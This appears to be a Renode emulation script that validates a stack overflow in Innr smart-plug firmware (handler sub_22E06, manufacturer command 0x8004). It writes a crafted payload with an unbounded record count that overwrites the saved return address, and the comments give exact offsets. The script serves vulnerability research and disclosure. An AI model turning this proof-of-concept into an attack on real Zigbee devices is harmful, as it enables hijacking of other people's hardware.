:name: ZB-03 Innr plug sub_22E06 stack overflow → saved-LR — emulation-based validation
:description: Drives the manufacturer-command handler sub_22E06 (mfg cmd 0x8004) of the real Innr plug firmware on the emulated EFR32MG21 and demonstrates the unbounded record-count stack overflow overwriting the saved return address.
#
# Bug (sub_22E06 @0x22e06): count1 = a3[11] read unclamped; inner loop writes
# buffer[i] = a3[12+2i] | (a3[13+2i]<<8) via `strh.w r8,[r11, r7<<1]` @0x22ee2
# into a stack array at SP_f+0x24, no capacity check. Saved LR sits at halfword
# index 56, so count1>=58 overwrites it with fully attacker-controlled bytes
# a3[124..127]. Parity guard: (a4-13) must be even.
# Gate sub_22E06(a1, a2=cmd-struct, a3=payload, a4=len): a2[0]==0 &&
# a2[1]==(entry[8]|0x8000)==0x8004; entry from table @0x2000F434 keyed by a3[0].

$bin=@scripts/silabs-vuln/zb03_innr.elf
include @scripts/silabs-vuln/boot_mg21.resc

emulation RunFor "0.3"
pause

# --- Crafted payload at 0x20002000: a3[11]=58 (count1),
#   a3[124..127] = 0x20006E01 (LE 01 6E 00 20) -> saved LR target.
#   Records 0..55 are zero-filled (harmless), index 56/57 carry the target.
sysbus WriteDoubleWord 0x20002008 0x3A000000
sysbus WriteDoubleWord 0x2000207C 0x20006E01

# --- Call frame: enter the case-0x8004 body directly at 0x22E5C (the overflow
#   loop never touches the entry-gate state), so no table/cmd-struct seeding is
#   needed and the sink is reached in fewer instructions.
#   r4=a3(payload), r6=a4(len=13; parity (13-13)=0 even), LR sentinel.
#   SP set to the POST-prologue value (entry 0x20007000 - 0x98) since we skip
#   the `sub sp,#0x70` prologue; then buffer base SP+0x24 puts index 56 exactly
#   at 0x20006FFC (where the real saved LR would live).
sysbus.cpu SetRegister 13 0x20006F68
sysbus.cpu SetRegister 14 0x0000DEAD
sysbus.cpu SetRegister 4  0x20002000
sysbus.cpu SetRegister 6  0x0000000D
sysbus.cpu PC 0x22E5C

echo ">>> BEFORE: saved-LR slot @0x20006FFC ="
sysbus ReadDoubleWord 0x20006FFC

sysbus AddWatchpointHook 0x20006FFC DoubleWord Write "self.NoisyLog('>>> WATCHPOINT HIT: overflow overwrote saved-LR slot 0x20006FFC = 0x{0:X}'.format(value))"

sysbus.cpu Step 2500

echo ">>> AFTER overflow: saved-LR slot @0x20006FFC (expect 0x20006E01) ="
sysbus ReadDoubleWord 0x20006FFC
